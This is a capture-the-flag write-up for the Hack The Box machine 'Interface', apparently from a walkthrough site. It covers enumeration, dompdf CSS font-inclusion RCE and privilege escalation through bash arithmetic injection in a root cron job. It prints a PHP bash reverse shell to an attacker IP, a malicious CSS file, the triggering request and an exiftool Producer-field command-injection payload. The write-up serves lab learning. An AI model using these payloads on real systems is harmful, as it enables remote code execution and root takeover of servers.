# Interface

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.87.208 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 10:17 EST
Nmap scan report for 10.129.87.208
Host is up (0.019s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We can add `interface.htb` to our `/etc/hosts` file.&#x20;

### Port 80 Enum

The web application reveals this:

<figure><img src="../../../.gitbook/assets/image (3457).png" alt=""><figcaption></figcaption></figure>

We can start with a simple `gobuster` scan to enumerate the possible endpoints in both directories and subdomains. However, the weird part is that there was nothing to be found from these.&#x20;

We can try to see the HTTP requests that are being sent and received using Burpsuite. When sending a GET request, this is what we see in return:

{% code overflow="wrap" %}
```http
HTTP/1.1 304 Not Modified
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 19 Feb 2023 15:22:38 GMT
Connection: close
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
X-Powered-By: Next.js
ETag: "i8ubiadkff4wf"
```
{% endcode %}

There was a Content-Security-Policy (CSP), which is something I don't see often on HTB. Specifically, we can see that the `unsafe-inline` and `unsafe-eval` options are set. This is a security misconfiguration that is probably the foothold.

{% embed url="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-csp-rules" %}

Within that field, we can also see a `prd.m.rendering-api.interface.htb` domain. We can add that to the hosts file, and go to it.

```
$ curl http://prd.m.rendering-api.interface.htb/
File not found.
```

So this endpoint accepts a file of some kind. This, combined with the CSP configurations tells me that we are allowed to execute Javascript code on the machine somehow. Anyways, I still ran a `gobuster` on the domain just in case. Immediately, we would find quite a `/vendor` directory, which has more directories behind it.

```
/p                    (Status: 502) [Size: 182]
/space                (Status: 502) [Size: 182]
/screenshots          (Status: 502) [Size: 182]
/2001                 (Status: 502) [Size: 182]
/member               (Status: 502) [Size: 182]
/hardware             (Status: 502) [Size: 182]
/faqs                 (Status: 502) [Size: 182]
/welcome              (Status: 502) [Size: 182]
/join                 (Status: 502) [Size: 182]
/link                 (Status: 502) [Size: 182]
/virus                (Status: 502) [Size: 182]
/announcements        (Status: 502) [Size: 182]
/do                   (Status: 502) [Size: 182]
/cc                   (Status: 502) [Size: 182]
/get                  (Status: 502) [Size: 182]
/bb                   (Status: 502) [Size: 182]
/192                  (Status: 502) [Size: 182]
/ethics               (Status: 502) [Size: 182]
/gps                  (Status: 502) [Size: 182]
/url                  (Status: 502) [Size: 182]
/203                  (Status: 502) [Size: 182]
/opinions             (Status: 502) [Size: 182]
/components           (Status: 502) [Size: 182]
/composer             (Status: 403) [Size: 15]
```

`/composer` did not have anything I could make use of. I decided to check whether a `/api` endpoint existed because the URL had API in it, and it did.

```
$ curl http://prd.m.rendering-api.interface.htb/api         
{"status":"404","status_text":"route not defined"}
```

Some JSON was returned, and there's mentionf of a 'route not defined' error.&#x20;

I ran another `gobuster` search with a larger wordlist and the `php,html,txt` extensions to fully find all the stuff I can, and still found nothing. Only when I ran a `ffuf` scan using POST requests, did I find one interesting `/api/html2pdf` endpoint.

{% code overflow="wrap" %}
```bash
$ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50

html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 13ms]
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3820).png" alt=""><figcaption></figcaption></figure>

I did the same scan on the `/vendor` endpoint and found this:

```
dompdf                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 13ms]
```

Dompdf is a HTML to PDF converter for PHP. The exploit path is a bit clearer now.

### RCE via dompdf

dompdf has recentyl reported some RCE exploits using CSS File Inclusion.

{% embed url="https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf" %}

{% embed url="https://github.com/positive-security/dompdf-rce" %}

The PoC states that by creating a CSS file that redirects the server to a PHP file, we can execute PHP code, which can be used to easily gain a shell. The PoC requires us to somehow generate a PDF, and I think that the html2pdf endpoint we found on API should work.&#x20;

Now, we need to find out how to send HTML data into that API. Based on the PoC, we should be sending some HTML frames into this API. After some testing, it seems that the variable is `html`.

<figure><img src="../../../.gitbook/assets/image (1820).png" alt=""><figcaption></figcaption></figure>

Now we can attempt to gain a shell. First, we need to create a PHP reverse shell one-liner and a malicious CSS file, then host them both on a Python HTTP server (hosting them on a PHP server does not work for some reason).&#x20;

Take note that the PHP file has to be a legit CSS file, and we just need to change the extension to PHP. We can grab such a file from the Github PoC link I put earlier.  Then, we can use `vim` to write this extra line:

{% code title="exploit_font.php" %}
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'");?>
```
{% endcode %}

{% code title="exploit.css" %}
```css
@font-face{
        font-family:'DejaVuSerif';
        src:url('http://10.10.14.22/exploit_font.php');
        font-weight:'normal';
        font-style:'normal';
}
```
{% endcode %}

Then, we need to find the SHA1 hash of the link to our server, in this case mine is `http://10.10.14.22/exploit_font.php`, which becomes `a9e48a0532165b117a0ca8132955581e`.&#x20;

Then, we need to send this HTTP POST request to the API:

```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/jsonS
Content-Length: 25

{"html":"<link rel=stylesheet href='http://10.10.14.22/exploit.css'>"}
```

This would make the server send a GET request for both files:

```
10.129.87.208 - - [19/Feb/2023 11:12:27] "GET /mal.css HTTP/1.0" 200 -                       
10.129.87.208 - - [19/Feb/2023 11:12:27] "GET /exploit_font.php HTTP/1.0" 200 -
```

On the machine, our file is now saved in the fonts directory as `exploitfont_normal_d2706fefee906d9288c3b6c4bcddfe5a.php`. After this, all we need to do is send a GET request to this URL: `curl http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_a9e48a0532165b117a0ca8132955581e.php`.

This would give us a reverse shell.

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

We can capture the user flag from this.

## Privilege Escalation

Finding the PE for this was rather challenging. I downloaded `pspy64` to the machine to view it's processes and found an interesting cronjob running.

```
2023/02/19 17:16:01 CMD: UID=0    PID=35554  | /bin/bash /usr/local/sbin/cleancache.sh 
2023/02/19 17:16:01 CMD: UID=0    PID=35553  | /bin/sh -c /usr/local/sbin/cleancache.sh 
2023/02/19 17:16:01 CMD: UID=0    PID=35552  | /usr/sbin/CRON -f 
2023/02/19 17:16:01 CMD: UID=0    PID=35557  | cut -d   -f1 
2023/02/19 17:16:01 CMD: UID=0    PID=35556  | /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/pspy64                                                                          
2023/02/19 17:16:01 CMD: UID=0    PID=35555  | /bin/bash /usr/local/sbin/cleancache.sh 
```

Here's the `cleancache.sh` script that is running:

```bash
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

This is running Exiftool 12.55, which does not have any glaring RCE exploits. The command run seems to only print out the Producer field from a file.

<figure><img src="../../../.gitbook/assets/image (3521).png" alt=""><figcaption></figcaption></figure>

From this, we have to somehow include a reverse shell or something using escape characters. I notice that the Producer variable within the exiftool output is unquoted.

In Bash, a single quote would treat all characters within the quotes as strings and not process it. If it is in double quotes, **variables and expressions will be processed.**

<figure><img src="../../../.gitbook/assets/image (3348).png" alt=""><figcaption></figcaption></figure>

So, in this case, we need to find a way to inject commands into the Producer variable in Bash. Here are some resources I've found when researching this:

{% embed url="https://stackoverflow.com/questions/65399335/unquoted-expression-injection-bash" %}

{% embed url="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells" %}

The second one was the most interesting. Through naming a file a specific thing, we are able to inject commands into it:

```
$ touch x 'x -a a[0$(uname>&2)] -gt 1'
$ ksh -c 'for f in *; do [ -f $f ]; done'
Linux
```

The Producer field of this file is the vulnerability here. I tested this out on my machine, and it works.

<figure><img src="../../../.gitbook/assets/image (2795).png" alt=""><figcaption></figcaption></figure>

Now, we can exploit this by creating a simple PE bash script to make `/bin/bash` an SUID binary. Then, we can change the Producer field to make the machine execute our script.

{% code overflow="wrap" %}
```bash
/usr/bin/exiftool -Producer="a[0\$(/dev/shm/pe.sh>&2)]" /tmp/sample.png
```
{% endcode %}

Then, we wait till it executes our script.

<figure><img src="../../../.gitbook/assets/image (2491).png" alt=""><figcaption></figcaption></figure>

Interesting foothold, weird enumeration and really interesting PE through the unquoted variables.&#x20;
